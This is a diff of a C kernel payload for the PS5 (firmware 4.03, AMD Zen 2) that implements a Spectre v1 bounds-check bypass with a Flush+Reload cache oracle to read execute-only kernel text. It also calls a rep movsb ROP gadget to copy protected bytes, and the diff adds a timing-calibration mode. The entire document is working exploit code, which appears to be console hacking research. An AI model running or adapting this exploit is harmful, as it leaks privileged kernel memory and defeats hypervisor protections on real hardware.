@@ -1,37 +1,60 @@
 #include <stdint.h>
 
 /*
- * spectre_xom_read — Spectre v1 Flush+Reload ktext byte reader + rep movsb alternative
+ * spectre_xom_read v2 — Spectre v1 Flush+Reload ktext byte reader
+ *                        + rep movsb alternative + calibration mode
  *
- * PS5 FW 4.03, AMD Zen 2. Hypervisor enforces XOM on ktext via NPT.
- * This payload attempts to speculatively bypass NPT read restrictions
- * using a Spectre v1 bounds-check bypass with a Flush+Reload cache oracle.
- *
- * As a secondary test, tries the known rep_movsb;pop rbp;ret ktext gadget
- * to directly copy ktext bytes (in case HV instruction emulation skips
- * NPT read checks).
+ * v2 changes from v1:
+ *   - Added calibration mode (0x7300) to measure actual cache hit/miss timing
+ *   - Raised default threshold from 80 → 300 cycles
+ *   - Removed cli/sti (HV may intercept, causing VMEXIT disruption)
+ *   - Pre-touch all 256 probe pages before attack to ensure mapping
+ *   - Added raw timing dump in calibration mode
+ *   - Reduced excess lfence in timing loop (was over-serializing)
  *
  * fw_ver encoding:
  *   0x7000         = Control test: read known kdata byte via Spectre
  *   0x7100 + idx   = Attack: read ktext byte at get_timer_freq + idx
  *   0x7200         = rep movsb: copy 64 bytes from get_timer_freq
- *   0x7300 + off16 = Set target base (ktext_base + off16*256) for 0x71xx
+ *   0x7300         = Calibration: measure cache hit/miss/overhead timing
  *
  * Output layout (288 uint64_t slots, 2304 bytes):
  *   [0]     = MAGIC (lo32) | status (hi32)
  *   [1]     = kdata_base
  *   [2]     = ktext_base
- *   [3]     = mode | (target_offset << 16)
+ *   [3]     = mode
  *   [4]     = td_pcb
  *   [5]     = probe_base
- *   [6]     = threshold
+ *   [6]     = threshold used
  *   [7]     = num_rounds
- *   [8]     = control: expected byte
- *   [9]     = control: recovered byte
- *   [10]    = control: confidence
- *   [11]    = bytes_recovered / rep_movsb fault status
- *   [12..43] = per-byte results or rep_movsb data
- *   [64..95] = histogram dump for first byte (256 entries, packed 8 per slot)
+ *
+ *   Control/Attack (0x70/0x71):
+ *   [8]     = expected byte (control only)
+ *   [9]     = recovered byte
+ *   [10]    = confidence (best histogram count)
+ *   [11]    = match (control) / bytes_recovered (attack)
+ *   [12]    = target address
+ *   [13]    = recovered | (confidence<<8) | (2nd_best<<16) | (2nd_conf<<24)
+ *   [14]    = total_hits (sum of all histogram entries)
+ *   [64..127] = histogram[0..255] packed 4 × uint16_t per slot
+ *
+ *   Calibration (0x73):
+ *   [8]     = rdtscp overhead (min of 1000 measurements)
+ *   [9]     = cache hit time (min, after pre-load)
+ *   [10]    = cache miss time (min, after clflush)
+ *   [11]    = suggested threshold (midpoint)
+ *   [12]    = cache hit time (avg of 100)
+ *   [13]    = cache miss time (avg of 100)
+ *   [14..77] = raw hit times (first 64, packed 4 per slot as uint16_t)
+ *   [78..141]= raw miss times (first 64, packed 4 per slot as uint16_t)
+ *
+ *   rep movsb (0x72):
+ *   [11]    = fault status (0=success, 0xFAFA...=faulted)
+ *   [12..19]= copied bytes (64 bytes = 8 slots)
+ *   [20]    = source address
+ *   [21]    = gadget address
+ *   [22]    = destination buffer address
+ *
  *   [287]   = end marker
  */
 
@@ -51,9 +74,9 @@
 #define PROBE_OFFSET     0x4000000    /* 64MB into kdata */
 #define PAGE_STRIDE      4096
 #define TRAIN_ARRAY_SZ   16
-#define NROUNDS          200          /* rounds per byte */
+#define NROUNDS          500          /* rounds per byte (up from 200) */
 #define TRAIN_ITERS      30           /* 29 training + 1 attack per group */
-#define CACHE_THRESHOLD  80           /* cycles: below = cache hit */
+#define CACHE_THRESHOLD  300          /* cycles: raised from 80 */
 
 /* Output slot count */
 #define OUT_SLOTS        288
@@ -129,12 +152,6 @@ static volatile uint64_t array_bound = TRAIN_ARRAY_SZ;
 
 /* ------------------------------------------------------------------ */
 /* Spectre v1 victim function                                          */
-/*                                                                     */
-/* The branch `if (x < *bound)` is trained to predict TAKEN. On the    */
-/* attack iteration, x is out-of-bounds (pointing to ktext), and       */
-/* *bound is not in cache, so the CPU speculatively executes the body   */
-/* before the branch resolves. The speculative load from the probe      */
-/* array encodes the secret byte into cache state.                     */
 /* ------------------------------------------------------------------ */
 
 static void __attribute__((noinline))
@@ -145,31 +162,29 @@ victim_function(uint8_t *array, volatile uint64_t *bound,
         uint64_t val = array[x];
         volatile uint8_t *probe_addr =
             (volatile uint8_t *)(probe_base + val * PAGE_STRIDE);
-        (void)*probe_addr;  /* speculative cache load */
+        (void)*probe_addr;
     }
 }
 
 /* ------------------------------------------------------------------ */
 /* Read one byte via Spectre v1 Flush+Reload                           */
-/*                                                                     */
-/* Returns the recovered byte. Writes confidence to *out_conf.         */
-/* Writes full histogram to hist_out (256 entries) if non-NULL.        */
 /* ------------------------------------------------------------------ */
 
 static uint8_t spectre_read_byte(
     uint64_t target_addr,
     uint64_t probe_base,
     int num_rounds,
+    uint64_t threshold,
     uint16_t *out_conf,
-    uint16_t *hist_out)
+    uint16_t *hist_out,
+    uint64_t *out_total_hits)
 {
-    /* Histogram on stack: 256 * 2 = 512 bytes */
     uint16_t histogram[256];
     for (int i = 0; i < 256; i++)
         histogram[i] = 0;
 
-    /* Compute attack offset: index into training_data that reaches target */
     uint64_t attack_offset = target_addr - (uint64_t)training_data;
+    uint64_t total_hits = 0;
 
     for (int round = 0; round < num_rounds; round++) {
         /* 1. Flush all 256 probe pages */
@@ -187,12 +202,7 @@ static uint8_t spectre_read_byte(
 
             /*
              * Branchless index selection:
-             * When mix_i < 29: use training index (in-bounds)
-             * When mix_i == 29: use attack_offset (out-of-bounds → ktext)
-             *
-             * (mix_i - 29) is negative for mix_i < 29 → bit 63 = 1
-             * >> 63 gives 1, ~1 = 0 → mask = 0 (training)
-             * When mix_i == 29: (0) >> 63 = 0, ~0 = all-ones → mask (attack)
+             * mix_i < 29: training (in-bounds), mix_i == 29: attack
              */
             uint64_t diff = (uint64_t)((int64_t)mix_i - (TRAIN_ITERS - 1));
             uint64_t mask = ~(diff >> 63);
@@ -205,37 +215,27 @@ static uint8_t spectre_read_byte(
         mfence_barrier();
         lfence_barrier();
 
-        /* 3. Timing phase: measure access time to each probe page */
-        /* Disable interrupts for clean timing */
-        __asm__ volatile("cli" ::: "memory");
-
+        /* 3. Timing phase — NO cli/sti (HV may intercept) */
         for (int i = 0; i < 256; i++) {
-            /*
-             * Scan in mixed order to reduce prefetcher correlation.
-             * Simple xor shuffle: i ^ 0xA5 gives a permutation of 0..255.
-             */
+            /* Scrambled order to avoid prefetcher */
             int idx = i ^ 0xA5;
 
             volatile uint8_t *addr =
                 (volatile uint8_t *)(probe_base + (uint64_t)idx * PAGE_STRIDE);
 
-            lfence_barrier();
             uint64_t t0 = rdtscp_val();
-            lfence_barrier();
             (void)*addr;
-            lfence_barrier();
             uint64_t t1 = rdtscp_val();
-            lfence_barrier();
 
             uint64_t delta = t1 - t0;
-            if (delta < CACHE_THRESHOLD)
+            if (delta < threshold) {
                 histogram[idx]++;
+                total_hits++;
+            }
         }
-
-        __asm__ volatile("sti" ::: "memory");
     }
 
-    /* Find best candidate (exclude training values 0-15 for ktext reads) */
+    /* Find best candidate */
     uint8_t best = 0;
     uint16_t best_count = 0;
     for (int i = 0; i < 256; i++) {
@@ -247,8 +247,9 @@ static uint8_t spectre_read_byte(
 
     if (out_conf)
         *out_conf = best_count;
+    if (out_total_hits)
+        *out_total_hits = total_hits;
 
-    /* Copy histogram if requested */
     if (hist_out) {
         for (int i = 0; i < 256; i++)
             hist_out[i] = histogram[i];
@@ -270,30 +271,23 @@ static uint64_t try_rep_movsb(
 {
     uint64_t result;
     __asm__ volatile(
-        /* Arm pcb_onfault */
         "leaq 2f(%%rip), %%rax\n\t"
         "movq %%rax, (%[onfault])\n\t"
 
-        /* Set up rep movsb: RSI=src, RDI=dst, RCX=count */
         "movq %[src], %%rsi\n\t"
         "movq %[dst], %%rdi\n\t"
         "movq %[cnt], %%rcx\n\t"
 
-        /* The gadget is: rep movsb; pop rbp; ret
-         * Push a dummy RBP for the pop */
         "pushq %%rbp\n\t"
 
-        /* Call the gadget */
         "callq *%[gadget]\n\t"
 
-        /* Success path */
         "movq $0, %[result]\n\t"
         "movq $0, (%[onfault])\n\t"
         "jmp 1f\n\t"
 
-        /* Fault recovery path */
         "2:\n\t"
-        "addq $8, %%rsp\n\t"  /* fix RSP: callq pushed ret addr */
+        "addq $8, %%rsp\n\t"
         "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"
 
         "1:\n\t"
@@ -333,7 +327,7 @@ int module_start(kproc_args *args)
     uint64_t td_pcb = read8(curthread + TD_PCB);
     uint64_t onfault_addr = td_pcb + PCB_ONFAULT;
 
-    /* Write header (magic written early for crash diagnostics) */
+    /* Write header */
     out32[0] = MAGIC_SPEC;
     out32[1] = 0x01;  /* in-progress */
     out[1] = kdata_base;
@@ -347,11 +341,101 @@ int module_start(kproc_args *args)
     uint16_t mode_hi = (fw_ver >> 8) & 0xFF;
     uint16_t mode_lo = fw_ver & 0xFF;
 
-    if (mode_hi == 0x70) {
+    /* Pre-touch all 256 probe pages to ensure they're mapped.
+     * Read (not write) to avoid corrupting kernel data. If a page
+     * isn't mapped, the read will fault — but kdata pages should exist. */
+    if (mode_hi == 0x70 || mode_hi == 0x71 || mode_hi == 0x73) {
+        for (int i = 0; i < 256; i++) {
+            volatile uint8_t *p =
+                (volatile uint8_t *)(probe_base + (uint64_t)i * PAGE_STRIDE);
+            (void)*p;
+        }
+        mfence_barrier();
+    }
+
+    if (mode_hi == 0x73) {
+        /* ============================================================
+         * MODE 0x7300: CALIBRATION
+         * Measure actual cache hit/miss timing on this hardware.
+         * Critical for setting the right threshold.
+         * ============================================================ */
+        out[3] = 0x7300;
+
+        volatile uint8_t *test_addr =
+            (volatile uint8_t *)(probe_base);
+
+        /* Measure rdtscp overhead */
+        uint64_t min_overhead = ~0ULL;
+        for (int i = 0; i < 1000; i++) {
+            lfence_barrier();
+            uint64_t t0 = rdtscp_val();
+            uint64_t t1 = rdtscp_val();
+            uint64_t d = t1 - t0;
+            if (d < min_overhead) min_overhead = d;
+        }
+
+        /* Measure cache HIT time: read same address repeatedly (stays in L1) */
+        (void)*test_addr;  /* prime cache */
+        uint64_t min_hit = ~0ULL;
+        uint64_t sum_hit = 0;
+        uint16_t raw_hits[256];
+        for (int i = 0; i < 256; i++) raw_hits[i] = 0;
+
+        for (int i = 0; i < 1000; i++) {
+            (void)*test_addr;  /* ensure cached */
+            uint64_t t0 = rdtscp_val();
+            (void)*test_addr;
+            uint64_t t1 = rdtscp_val();
+            uint64_t d = t1 - t0;
+            if (d < min_hit) min_hit = d;
+            if (i < 100) sum_hit += d;
+            if (i < 256) raw_hits[i] = (d > 0xFFFF) ? 0xFFFF : (uint16_t)d;
+        }
+
+        /* Measure cache MISS time: clflush then read */
+        uint64_t min_miss = ~0ULL;
+        uint64_t sum_miss = 0;
+        uint16_t raw_misses[256];
+        for (int i = 0; i < 256; i++) raw_misses[i] = 0;
+
+        for (int i = 0; i < 1000; i++) {
+            clflush(test_addr);
+            mfence_barrier();
+            uint64_t t0 = rdtscp_val();
+            (void)*test_addr;
+            uint64_t t1 = rdtscp_val();
+            uint64_t d = t1 - t0;
+            if (d < min_miss) min_miss = d;
+            if (i < 100) sum_miss += d;
+            if (i < 256) raw_misses[i] = (d > 0xFFFF) ? 0xFFFF : (uint16_t)d;
+        }
+
+        out[8] = min_overhead;
+        out[9] = min_hit;
+        out[10] = min_miss;
+        out[11] = (min_hit + min_miss) / 2;  /* suggested threshold */
+        out[12] = sum_hit / 100;     /* avg hit */
+        out[13] = sum_miss / 100;    /* avg miss */
+
+        /* Pack raw hit times: 4 uint16_t per uint64_t slot */
+        for (int i = 0; i < 256; i++) {
+            int slot = 14 + (i / 4);
+            int shift = (i % 4) * 16;
+            out[slot] |= ((uint64_t)raw_hits[i]) << shift;
+        }
+        /* Pack raw miss times */
+        for (int i = 0; i < 256; i++) {
+            int slot = 78 + (i / 4);
+            int shift = (i % 4) * 16;
+            out[slot] |= ((uint64_t)raw_misses[i]) << shift;
+        }
+
+        out32[1] = 0x30;  /* calibration done */
+
+    } else if (mode_hi == 0x70) {
         /* ============================================================
          * MODE 0x7000: CONTROL TEST
          * Read a known kdata byte via Spectre to validate the pipeline.
-         * We read the first byte of the IDT (known, we can direct-read it).
          * ============================================================ */
         uint64_t target = kdata_base + OFF_IDT;
         uint8_t expected = read1(target);
@@ -361,21 +445,24 @@ int module_start(kproc_args *args)
 
         uint16_t confidence = 0;
         uint16_t hist_buf[256];
+        uint64_t total_hits = 0;
         uint8_t recovered = spectre_read_byte(
-            target, probe_base, NROUNDS, &confidence, hist_buf);
+            target, probe_base, NROUNDS, CACHE_THRESHOLD,
+            &confidence, hist_buf, &total_hits);
 
         out[9] = recovered;
         out[10] = confidence;
         out[11] = (expected == recovered) ? 1 : 0;
+        out[14] = total_hits;
 
-        /* Dump histogram packed: 8 uint16_t per slot → 32 slots for 256 entries */
+        /* Pack histogram */
         for (int i = 0; i < 256; i++) {
             int slot = 64 + (i / 4);
             int shift = (i % 4) * 16;
             out[slot] |= ((uint64_t)hist_buf[i] & 0xFFFF) << shift;
         }
 
-        /* Second-best candidate */
+        /* Second-best */
         uint8_t second = 0;
         uint16_t second_count = 0;
         for (int i = 0; i < 256; i++) {
@@ -395,32 +482,30 @@ int module_start(kproc_args *args)
         /* ============================================================
          * MODE 0x7100 + idx: KTEXT ATTACK
          * Read ktext byte at get_timer_freq + idx.
-         * This is the real test: can Spectre bypass NPT XOM?
          * ============================================================ */
         uint64_t target_offset = OFF_GET_TIMER_FREQ + mode_lo;
         uint64_t target = ktext_base + target_offset;
 
         out[3] = 0x7100 | ((uint64_t)target_offset << 16);
 
-        /* Read up to 8 bytes starting at target */
         int num_bytes = 8;
         if (mode_lo + num_bytes > 255)
-            num_bytes = 1;  /* stay within single-byte range */
+            num_bytes = 1;
 
         out[11] = num_bytes;
 
         for (int b = 0; b < num_bytes; b++) {
             uint16_t conf = 0;
             uint16_t hist_buf[256];
+            uint64_t total_hits = 0;
             uint8_t byte_val = spectre_read_byte(
-                target + b, probe_base, NROUNDS, &conf,
-                (b == 0) ? hist_buf : (uint16_t *)0);
+                target + b, probe_base, NROUNDS, CACHE_THRESHOLD,
+                &conf, (b == 0) ? hist_buf : (uint16_t *)0,
+                &total_hits);
 
-            /* Per-byte result */
             out[12 + b * 4 + 0] = target + b;
             out[12 + b * 4 + 1] = (uint64_t)byte_val | ((uint64_t)conf << 8);
 
-            /* Noise metric: sum of all non-best histogram entries */
             if (b == 0) {
                 uint64_t noise = 0;
                 uint8_t second = 0;
@@ -435,8 +520,8 @@ int module_start(kproc_args *args)
                 }
                 out[12 + 2] = noise;
                 out[12 + 3] = (uint64_t)second | ((uint64_t)second_count << 8);
+                out[14] = total_hits;
 
-                /* Histogram dump for byte 0 */
                 for (int i = 0; i < 256; i++) {
                     int slot = 64 + (i / 4);
                     int shift = (i % 4) * 16;
@@ -450,30 +535,25 @@ int module_start(kproc_args *args)
     } else if (mode_hi == 0x72) {
         /* ============================================================
          * MODE 0x7200: REP MOVSB DIRECT COPY
-         * Try copying 64 bytes from ktext via rep_movsb;pop rbp;ret gadget.
-         * If HV emulates rep movsb without NPT read check → we get bytes.
          * ============================================================ */
         uint64_t ktext_src = ktext_base + OFF_GET_TIMER_FREQ;
-        uint64_t kdata_dst = kdata_base + 0x5000;  /* safe kdata buffer */
+        uint64_t kdata_dst = kdata_base + 0x5000;
         uint64_t count = 64;
-        uint64_t gadget = kdata_base + OFF_REP_MOVSB;  /* ktext address */
+        uint64_t gadget = kdata_base + OFF_REP_MOVSB;
 
         out[3] = 0x7200 | ((uint64_t)OFF_GET_TIMER_FREQ << 16);
 
-        /* Zero destination buffer first */
         for (int i = 0; i < 8; i++)
             write8(kdata_dst + i * 8, 0);
 
         uint64_t fault = try_rep_movsb(
             ktext_src, kdata_dst, count, gadget, onfault_addr);
 
-        out[11] = fault;  /* 0 = success, 0xFAFA... = faulted */
+        out[11] = fault;
 
-        /* Copy result bytes to output */
         for (int i = 0; i < 8; i++)
             out[12 + i] = read8(kdata_dst + i * 8);
 
-        /* Mark source and gadget addresses */
         out[20] = ktext_src;
         out[21] = gadget;
         out[22] = kdata_dst;
@@ -481,7 +561,7 @@ int module_start(kproc_args *args)
         out32[1] = 0x20;  /* rep movsb done */
 
     } else {
-        out32[1] = 0xFF;  /* unknown mode */
+        out32[1] = 0xFF;
     }
 
     out[287] = 0xDEADCAFE53504543ULL;
